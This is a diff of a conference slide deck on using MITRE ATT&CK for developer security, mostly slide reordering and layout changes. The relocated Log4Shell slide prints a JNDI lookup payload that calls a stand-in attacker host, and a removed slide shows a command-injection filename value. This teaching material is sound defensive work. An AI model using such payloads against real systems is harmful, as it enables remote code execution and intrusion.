@@ -9,9 +9,16 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 <!-- _class: title -->
 
+![w:200px center](./themes/techorama/robot-knight-mascot.png)
+
+
+![bg fill](./themes/techorama/medieval-pattern-dark.png)
+
 # <!-- fit --> MITRE ATT&CK for Developers
 
 ## <!-- fit --> The Crooked Line: How Attackers Really Operate
+
+### Chris Ayers
 
 <!-- Attackers don't follow a straight line. They zigzag, backtrack, pivot, and adapt. This talk explores how the MITRE ATT&CK framework maps these crooked paths — and what developers can do to straighten out their defenses. The crooked-line metaphor frames the talk: defenders often expect a straight path, while attackers zigzag, backtrack, and pivot across tactics like reconnaissance, lateral movement, and exfiltration. -->
 
@@ -36,11 +43,22 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 ## The Security Challenge
 
+<div class="columns">
+<div>
+
 - **Growing attack surface**: APIs, microservices, cloud infrastructure
 - **Sophisticated adversaries**: Nation-states, organized crime, insider threats
 - **Complex attack chains**: Multiple techniques chained together
 - **Traditional defenses**: Often focus on single points of failure
 - **Reality**: Attackers adapt faster than our defenses
+
+</div>
+<div>
+
+![](./themes/techorama/princess-tower-window.png)
+
+</div>
+</div>
 
 <!-- The attack surface has exploded. We're not just building monoliths anymore — we have APIs, microservices, serverless, and cloud infrastructure. And attackers don't just try one thing. They chain techniques together in complex kill chains. Our defenses need to evolve beyond "patch and pray." -->
 
@@ -71,7 +89,7 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 ## MITRE Cybersecurity Ecosystem
 
-![center](./img/mitre-ecosystem.drawio.png)
+![w:1000px center](./img/mitre-ecosystem.drawio.png)
 
 <!-- ATT&CK isn't the only framework from MITRE. D3FEND maps defensive countermeasures, ATLAS covers AI/ML threats, and ENGAGE provides adversary engagement strategies. Together they form a comprehensive ecosystem. But ATT&CK is the foundation — and the most relevant for developers. -->
 
@@ -90,7 +108,7 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 ## The 14 ATT&CK Tactics
 
-![center](./img/14-attack-tactics.drawio.png)
+![w:650px center](./img/14-attack-tactics.drawio.png)
 
 <!-- This is the kill chain — the crooked line from our title slide. Notice how it's grouped: Pre-Attack for reconnaissance, Get In for initial compromise, Stay In for maintaining access, and Act for achieving objectives. Attackers don't always go linearly — they loop back, skip steps, and adapt. Today we'll focus on the seven tactics most relevant to developers: Initial Access, Execution, Persistence, Credential Access, Defense Evasion, Supply Chain (which maps to multiple tactics), and Collection/Exfiltration. Tactics like Lateral Movement and Privilege Escalation are critical but typically fall more to infrastructure and platform teams — we'll touch on where they intersect with your code. -->
 
@@ -125,15 +143,9 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 <!-- _class: parchment -->
 
-## Why Not Both?
+## Why not Both?
 
-![center w:65%](./img/memes/why-not-both.jpg)
-
-<!-- The setup for the next slide. OWASP versus ATT&CK sounds like a choice: vulnerabilities or adversary behavior, prevention or detection. The punchline is both — OWASP helps prevent the bug, ATT&CK helps detect what attackers do when prevention is not enough. -->
-
----
-
-## Why Both?
+![bg right fit](./img/memes/why-not-both.jpg)
 
 > "OWASP prevents vulnerabilities. ATT&CK detects adversary behavior."
 
@@ -142,7 +154,7 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 - **Defense in depth**: Multiple security perspectives
 - **Complete coverage**: Technical vulnerabilities + adversary techniques
 
-<!-- The key insight: real-world breaches are never a single vulnerability. They're chains of techniques. SolarWinds was supply chain compromise leading to lateral movement leading to data exfiltration. You need prevention AND detection to handle the full lifecycle. -->
+<!-- The setup IS the punchline: OWASP versus ATT&CK sounds like a choice — vulnerabilities or adversary behavior, prevention or detection. Real-world breaches are never a single vulnerability; they're chains of techniques. SolarWinds was supply chain compromise leading to lateral movement leading to data exfiltration. You need prevention AND detection to handle the full lifecycle. -->
 
 ---
 
@@ -158,31 +170,6 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 
 <!-- This mapping is incredibly useful. When you fix an OWASP vulnerability, you're actually blocking specific ATT&CK techniques. Fixing SQL injection doesn't just close a bug — it blocks T1190, which is the front door for dozens of attack chains. Understanding this connection helps you prioritize what to fix first. -->
 
----
-<!-- _class: parchment -->
-
-## Deployment Security Alignment Chart
-
-<div class="columns">
-<div>
-
-![w:100%](./img/memes/alignment-chart.jpg)
-
-</div>
-<div>
-
-|  | Good | Neutral | Evil |
-|---|---|---|---|
-| **Lawful** | Policy gate | Checklist | Ticket theater |
-| **Neutral** | Threat model | Baseline | Debug door |
-| **Chaotic** | Hotfix hero | Train patch | `chmod 777` |
-
-**ATT&CK lens:** T1190 — Exploit Public-Facing Application
-
-</div>
-</div>
-
-<!-- Alignment charts work because everyone recognizes the grid, but the lesson is practical: process alone is not security. Good deployment behavior creates gates, logs, and rollback paths that deny attackers easy T1190 openings. -->
 ---
 
 <!-- _class: section -->
@@ -227,6 +214,18 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 </div>
 
 <!-- SolarWinds is the poster child for why developers need ATT&CK. The attackers compromised the build system — not the source code — so code reviews missed it entirely. The malicious DLL was signed with SolarWinds' own certificate. 18,000 organizations installed it. It was undetected for 9 months. This is what a real crooked line looks like: supply chain to execution to credential theft to exfiltration, with defense evasion at every step. Medieval version: the king's own master smith forging the assassin's blade and stamping it with the royal seal. Nobody questions a sword with the right stamp. -->
+
+---
+
+<!-- _class: parchment -->
+
+## Deployment Security Alignment Chart
+
+![bg right:70% fit](./img/memes/alignment-chart.jpg)
+
+**ATT&CK lens:** When deployment hygiene fails — T1195 (Supply Chain), T1078 (Valid Accounts), T1505 (Server Software Component)
+
+<!-- SolarWinds is what happens when deployment hygiene fails at nation-state scale. Alignment charts work because everyone recognizes the grid — and the lesson lands: process alone is not security. Lawful Good behavior on the left builds the gates, logs, and rollback paths that turn supply-chain and credential abuse from a quiet 9-month dwell into a noisy 9-minute alert. The Chaotic Evil row on the right — debug doors left open, chmod 777 as "teamwork" — is how attackers turn a SolarWinds-style foothold into full compromise. -->
 
 ---
 
@@ -386,7 +385,7 @@ Shell:     That is technically a second spell.
 
 **ATT&CK lens:** T1059 — Command and Scripting Interpreter
 
-<!-- The joke is not that attackers are wizards; it is that shells are dangerous interpreters. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. -->
+<!-- The joke is not that attackers are wizards; it is that shells are dangerous interpreters. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. The blast radius matters: one unchecked input inherits the API process privileges, reaches the command shell, the service account, and the internal network. Four walls later, everyone is standing outside. -->
 ---
 
 ## Vulnerable Code: Command Injection (T1059)
@@ -435,36 +434,7 @@ public IActionResult ProcessFile(string filename)
 
 <!-- The defended version never uses a shell. We validate the filename, use an allowlist of commands, escape arguments, and call the binary directly with ProcessStartInfo. No shell means no shell injection. Always avoid UseShellExecute when processing user input. -->
 
----
-<!-- _class: parchment -->
 
-## Fus Ro Dah: When One Bad Input Moves the Whole Stack
-
-<div class="columns">
-<div>
-
-![w:100%](./img/memes/fus-ro-dah.jpg)
-
-</div>
-<div>
-
-```text
-Input field accepts: report.pdf; restart-service billing
-
-API process      → command shell
-command shell    → service account
-service account  → internal network
-internal network → incident bridge
-```
-
-One unchecked string. Four walls later, everyone is standing outside.
-
-**ATT&CK lens:** T1059 — Command and Scripting Interpreter
-
-</div>
-</div>
-
-<!-- Fus Ro Dah is the blast-radius slide. The teaching point is that injection bugs are rarely contained to the input field; they inherit the privileges, network reach, and trust relationships of the process that runs them. -->
 ---
 
 ## Unsafe Deserialization (T1203)
@@ -490,7 +460,7 @@ def process_data():
         return "Invalid JSON", 400
 ```
 
-<!-- Pickle deserialization is essentially arbitrary code execution disguised as data parsing. The fix is simple — use JSON instead. If you must deserialize complex objects, use schema validation. Never deserialize untrusted data with pickle, YAML's unsafe loader, or Java's ObjectInputStream. -->
+<!-- Pickle is Python's built-in serializer — and effectively a remote-code-execution primitive when fed untrusted bytes. `pickle.loads()` reconstructs live objects, calling `__reduce__` and importing modules along the way, so an attacker's payload runs the moment you deserialize it. Same class of bug shows up in YAML's unsafe loader, Java's ObjectInputStream, PHP's unserialize(), and .NET's BinaryFormatter. The fix is simple — use JSON instead. If you must deserialize complex objects, use schema validation. Never deserialize untrusted data with pickle, YAML's unsafe loader, or Java's ObjectInputStream. -->
 
 ---
 
@@ -695,28 +665,6 @@ var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
 
 ---
 
-## Good Secrets Management - JavaScript
-
-```javascript
-// JAVASCRIPT: T1552 prevention — Managed Identity + Key Vault
-const { SecretClient } = require("@azure/keyvault-secrets");
-const { DefaultAzureCredential } = require("@azure/identity");
-
-// No API keys! Managed Identity handles auth via RBAC
-const credential = new DefaultAzureCredential();
-const client = new SecretClient(
-    "https://myvault.vault.azure.net", credential);
-
-async function getDbConnection() {
-    const secret = await client.getSecret("db-connection-string");
-    return secret.value;  // Fetched at runtime, never in code
-}
-```
-
-<!-- Same pattern in JavaScript with Azure Key Vault and Managed Identity. The key principle across all languages: no secrets in code, no API keys, authenticate with identity not credentials. Works with Azure, AWS IAM Roles, and GCP Workload Identity too. -->
-
----
-
 ## Automate Secret Detection (T1552 Prevention)
 
 - **GitHub Secret Scanning** — automatically detects tokens, keys, and credentials in your repos
@@ -792,15 +740,10 @@ async function getDbConnection() {
 </div>
 <div>
 
-```text
-PowerShell ran from a service account at 02:13
-curl posted 48 MB to an unknown host
-audit log cleared five minutes later
-
-             SNEAK 100
-```
-
-**ATT&CK lens:** T1059 command execution + T1070 log tampering + T1071 C2
+**ATT&CK lens:** 
+  -T1059 command execution
+  -T1070 log tampering
+  -T1071 C2
 
 </div>
 </div>
@@ -888,13 +831,73 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 | Story | Year | Attack Pattern | Classification |
 |-------|------|----------------|----------------|
 | **event-stream** | 2018 | Maintainer handoff → poisoned `flatmap-stream` dependency | Supply-chain compromise |
+| **SolarWinds** | 2020 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
+| **Log4Shell** | 2021 | Critical RCE in a trusted, uncompromised library | ⚠️ Dependency-trust failure |
+| **XZ Utils** | 2024 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
 | **Shai-Hulud** | 2025 | Self-replicating npm worm via `postinstall` lifecycle hooks | Supply-chain compromise |
 | **Notepad++** | 2025 | Update infrastructure hijacked → Chrysalis backdoor | Supply-chain compromise |
 | **Axios** | 2026 | Hijacked publisher → RAT via `postinstall` hook | Supply-chain compromise |
-| **Log4Shell** | 2021 | Critical RCE in a trusted, uncompromised library | ⚠️ Dependency-trust failure |
-| **SolarWinds · XZ Utils** | 2020 · 2024 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
 
 <!-- The arc tells a single story: your dependency graph is an attack surface at every layer. event-stream is the historical setup — a tiny trusted package became a weapon after a maintainer handoff. Shai-Hulud and Axios show the modern npm threat: install equals code execution when maintainer accounts are compromised. Notepad++ proves it isn't npm-only — developer tools and their update pipelines are targets too. Log4Shell is the other failure mode: no attacker needed, a trusted library's own flaw was enough. SolarWinds and XZ Utils are the nation-state tier — years of patience, build-pipeline access, and signed artifacts that looked entirely official. -->
+
+---
+
+## Log4Shell (2021) — Dependency-Trust Failure, Not Compromise
+
+<div class="columns">
+<div>
+
+### 🔓 CVE-2021-44228
+- **Log4j 2.0–2.14.1**: RCE via JNDI lookup injection
+- Any logged string could trigger code execution:
+  `${jndi:ldap://attacker.com/x}`
+- Transitive dependency — most teams didn't know they had it
+- CVSS 10.0 · patched in **Log4j 2.15.0**
+
+</div>
+<div>
+
+### ⚠️ Why It's a Different Failure Mode
+- Log4j maintainers were **not compromised**
+- No poisoned release, no hijacked publisher
+- A critical flaw in a **trusted, legitimate library**
+- Exposed lack of Software Bill of Materials (SBOM) visibility
+
+> The lesson: your dependency graph can betray you **even when nobody is attacking it.**
+
+</div>
+</div>
+
+<!-- Log4Shell doesn't belong in the same column as SolarWinds or event-stream. There was no malicious maintainer, no poisoned package, no hijacked build pipeline. Apache Log4j was doing exactly what it was designed to do — and that design had a critical flaw. This is the dependency-trust failure mode: you trusted the library, the library was wrong. The developer lesson: transitive dependencies can contain critical vulnerabilities you don't even know about. When Log4Shell dropped in December 2021, organizations scrambled for weeks just to answer "do we have Log4j?" With a Software Bill of Materials, that answer takes seconds, not weeks. -->
+
+---
+
+## Case Study: XZ Utils Backdoor (CVE-2024-3094)
+
+<div class="columns">
+<div>
+
+### 🕵️ The 2-Year Long Con
+1. **2021**: "Jia Tan" submits first patch
+2. **2022**: Sock puppets pressure maintainer
+3. **2023**: Becomes co-maintainer
+4. **2024**: Backdoor in tarballs only
+5. **Mar 29**: Found by accident
+
+</div>
+<div>
+
+### 🎯 ATT&CK Techniques
+- **T1195.001** — Supply chain compromise
+- **T1098** — Maintainer takeover
+- **T1027** — Obfuscation (not in git!)
+- **T1059** — Remote Code Execution (RCE) via SSHd · Common Vulnerability Scoring System (CVSS) 10.0
+- 💡 Caught: SSH was **500ms slower**
+
+</div>
+</div>
+
+<!-- This is the most sophisticated supply chain attack in open source history. A state-sponsored actor spent TWO YEARS building trust, contributing legitimate patches, then socially engineering their way to co-maintainer. The backdoor was only in the release tarballs, not the git repo — bypassing all code review. It was caught by sheer luck when Andres Freund noticed SSH performance degradation while debugging something unrelated. -->
 
 ---
 
@@ -928,35 +931,6 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 ---
 
-## Case Study: XZ Utils Backdoor (CVE-2024-3094)
-
-<div class="columns">
-<div>
-
-### 🕵️ The 2-Year Long Con
-1. **2021**: "Jia Tan" submits first patch
-2. **2022**: Sock puppets pressure maintainer
-3. **2023**: Becomes co-maintainer
-4. **2024**: Backdoor in tarballs only
-5. **Mar 29**: Found by accident
-
-</div>
-<div>
-
-### 🎯 ATT&CK Techniques
-- **T1195.001** — Supply chain compromise
-- **T1098** — Maintainer takeover
-- **T1027** — Obfuscation (not in git!)
-- **T1059** — Remote Code Execution (RCE) via SSHd · Common Vulnerability Scoring System (CVSS) 10.0
-- 💡 Caught: SSH was **500ms slower**
-
-</div>
-</div>
-
-<!-- This is the most sophisticated supply chain attack in open source history. A state-sponsored actor spent TWO YEARS building trust, contributing legitimate patches, then socially engineering their way to co-maintainer. The backdoor was only in the release tarballs, not the git repo — bypassing all code review. It was caught by sheer luck when Andres Freund noticed SSH performance degradation while debugging something unrelated. -->
-
----
-
 ## Case Study: Axios NPM Compromise (2026)
 
 <div class="columns">
@@ -987,35 +961,6 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 ---
 
-## Log4Shell (2021) — Dependency-Trust Failure, Not Compromise
-
-<div class="columns">
-<div>
-
-### 🔓 CVE-2021-44228
-- **Log4j 2.0–2.14.1**: RCE via JNDI lookup injection
-- Any logged string could trigger code execution:
-  `${jndi:ldap://attacker.com/x}`
-- Transitive dependency — most teams didn't know they had it
-- CVSS 10.0 · patched in **Log4j 2.15.0**
-
-</div>
-<div>
-
-### ⚠️ Why It's a Different Failure Mode
-- Log4j maintainers were **not compromised**
-- No poisoned release, no hijacked publisher
-- A critical flaw in a **trusted, legitimate library**
-- Exposed lack of Software Bill of Materials (SBOM) visibility
-
-> The lesson: your dependency graph can betray you **even when nobody is attacking it.**
-
-</div>
-</div>
-
-<!-- Log4Shell doesn't belong in the same column as SolarWinds or event-stream. There was no malicious maintainer, no poisoned package, no hijacked build pipeline. Apache Log4j was doing exactly what it was designed to do — and that design had a critical flaw. This is the dependency-trust failure mode: you trusted the library, the library was wrong. The developer lesson: transitive dependencies can contain critical vulnerabilities you don't even know about. When Log4Shell dropped in December 2021, organizations scrambled for weeks just to answer "do we have Log4j?" With a Software Bill of Materials, that answer takes seconds, not weeks. -->
-
----
 <!-- _class: parchment -->
 
 ## One Does Not Simply Patch Production
@@ -1253,47 +1198,19 @@ class ExfiltrationDetector {
 
 ## Detection Maturity: A Brief Evolution
 
-<div class="columns">
-<div>
-
-![h:460](./img/memes/galaxy-brain.jpg)
-
-</div>
-<div>
-
-- 🧠 Grep the logs for `"error"`
-- 🧠✨ Alert on failed login spikes
-- 🧠✨✨ Correlate technique IDs across systems with Security Information and Event Management (SIEM) + ATT&CK tags
-- 🧠✨✨✨ Behavioral analytics — the captain who notices the new guard limping the wrong way
+![bg right:55% fit](./img/memes/galaxy-brain.jpg)
 
 **ATT&CK lens:** T1071 — Application Layer Protocol
 
-</div>
-</div>
-
-<!-- This is the galaxy-brain format. The joke teaches the maturity curve: raw logs are useful, alerts are better, technique correlation gives shared language, and behavior analytics catches attacker movement that simple rules miss. -->
+<!-- This is the galaxy-brain format. The joke teaches the maturity curve: raw logs are useful, alerts are better, technique correlation gives shared language, and behavioral analytics catches attacker movement that simple rules miss. The captain who notices the new guard limping the wrong way — that's the top brain. Most teams live in the second or third panel; the goal of an ATT&CK-aware detection strategy is to push the median up one rung at a time. -->
 ---
 
 <!-- _class: parchment -->
 
 ## Defense in Depth Architecture
 
-<div class="columns">
-<div>
+![w:900px center](./img/defense-in-depth.drawio.png)
 
-![center](./img/defense-in-depth.drawio.png)
-
-</div>
-<div>
-
-### Concentric Walls
-- **Outer bailey**: WAF, rate limits, network controls
-- **Inner bailey**: authentication, RBAC, session controls
-- **Keep**: input validation, authorization, business rules
-- **Strongroom**: secrets management, encryption, data access monitoring
-
-</div>
-</div>
 
 <!-- Defense in depth means every layer has its own security controls. The outer bailey blocks noisy T1190 and T1110 attempts, the inner bailey limits stolen-key damage from T1078, the keep catches injection and business-logic abuse, and the strongroom protects secrets and data even after earlier walls fail. The point is not one perfect wall; it is forcing the attacker to beat independent controls at every layer while your detection has more chances to see them. -->
 
@@ -1301,7 +1218,7 @@ class ExfiltrationDetector {
 
 ## OWASP + ATT&CK Integration
 
-![center](./img/owasp-attack-integration.drawio.png)
+![w:1000px center](./img/owasp-attack-integration.drawio.png)
 
 <!-- This is how OWASP and ATT&CK work together in practice. OWASP gives you secure coding practices, vulnerability testing, and security reviews. ATT&CK adds behavioral monitoring, technique correlation, and threat hunting. Together, you get: Secure by Design, Monitor by Behavior, and Respond by Intelligence. Your existing tools — SAST, SIEM, code reviews, pen tests — all have both an OWASP angle (find vulnerabilities) and an ATT&CK angle (detect technique patterns). Leverage what you already have. -->
 
@@ -1343,15 +1260,11 @@ class ExfiltrationDetector {
 
 ## Roll Initiative: When the Alert Is Real
 
-<div class="columns">
-<div>
+![bg right fit](./img/memes/roll-initiative.png)
 
-![h:430](./img/memes/roll-initiative.jpg)
-
-</div>
-<div>
 
 ```text
+
 SIEM:  T1071 beacon pattern from build agent
 App:   unusual token use from impossible travel
 API:   30x normal export volume
@@ -1367,8 +1280,6 @@ Team:  ...roll initiative
 
 **ATT&CK lens:** T1071 — Application Layer Protocol
 
-</div>
-</div>
 
 <!-- This is the response handoff: detection only matters if the team knows the first moves. The practical lesson is to predefine containment and evidence-preservation actions for high-risk ATT&CK-tagged alerts. -->
 ---
@@ -1421,19 +1332,14 @@ Team:  ...roll initiative
 
 <!-- _class: parchment -->
 
-## How it started vs How it's going
+### How It Started vs How It's Going
 
-<div class="columns">
-<div>
+![bg right fit](./img/memes/how-it-started.jpg)
 
-![h:390](./img/memes/how-it-started.jpg)
-
-</div>
-<div>
 
 | How it started 😎 | How it's going 😱 |
 |---|---|
-| `// TODO: add authentication later` | `[CRITICAL] T1190 - SQLi in production` |
+| `// TODO: add auth later` | `[CRITICAL] T1190 - SQLi in production` |
 | `// TODO: rotate this API key` | `[CRITICAL] T1552 - API key on GitHub` |
 | `// TODO: add rate limiting` | `[CRITICAL] T1110 - 50K login attempts/hr` |
 | `// TODO: check dependencies` | `[CRITICAL] T1195 - Malicious dependency` |
@@ -1442,30 +1348,19 @@ Team:  ...roll initiative
 
 **ATT&CK lens:** T1190 — Exploit Public-Facing Application
 
-</div>
-</div>
-
 <!-- This is a joke but also very real. Every security TODO in your backlog is a technique an attacker can exploit. The difference between the left and right columns is just time. ATT&CK helps you prioritize which TODOs to fix first based on real adversary behavior. Medieval engineers also thought one tall wall was enough, right up until someone found the servant's door. -->
----
-
-<!-- _class: section -->
-
-# Key Takeaways
-
-<!-- Let's wrap up with the key messages I want you to take away from this talk. Leave with a map of the gates, keys, tunnels, watchtowers, and strongrooms your code needs to defend. -->
-
 ---
 
 ## Key Takeaways
 
 - ✅ **OWASP + ATT&CK = Complete Security** - Prevention + Detection
-- ✅ **Think Like an Attacker** - Understand adversary behavior patterns  
+- ✅ **Think Like an Attacker** - Understand adversary behavior patterns
 - ✅ **Build Detection Into Code** - Monitoring isn't just ops responsibility
 - ✅ **Log ATT&CK Technique IDs** - Enable security team correlation
 - ✅ **Use Behavioral Analytics** - Go beyond simple rule-based detection
 - ✅ **Start Small, Iterate** - Pick 3 techniques and expand coverage
 
-<!-- If you remember nothing else: OWASP and ATT&CK are complementary, not competing. Think like an attacker to build better defenses. Detection is a developer responsibility, not just ops. Tag your security events with ATT&CK IDs. Use behavioral analytics. And start with three techniques — don't try to cover everything at once. -->
+<!-- Wrapping up. Leave with a map of the gates, keys, tunnels, watchtowers, and strongrooms your code needs to defend. If you remember nothing else: OWASP and ATT&CK are complementary, not competing. Think like an attacker to build better defenses. Detection is a developer responsibility, not just ops. Tag your security events with ATT&CK IDs. Use behavioral analytics. And start with three techniques — don't try to cover everything at once. -->
 
 ---
 
@@ -1504,3 +1399,24 @@ Team:  ...roll initiative
 ![bg right](./img/owl.png)
 
 <!-- Thank you! I'm happy to take questions. If we run out of time, catch me in the hallway or reach out on BlueSky or LinkedIn. -->
+
+---
+
+<div class="columns">
+<div>
+
+# Tell Me How I Did
+
+- **What landed?** 
+- **Where go deeper?** 
+- **What to trim?** 
+
+</div>
+<div>
+
+![w:380](./themes/techorama/mitre_attck_for_developers-qr-code.png)
+
+</div>
+</div>
+
+<!-- Your feedback shapes the next chapter of this deck. Scan that scroll if you're willing to share what worked, what didn't, and where you'd like me to focus next time. -->
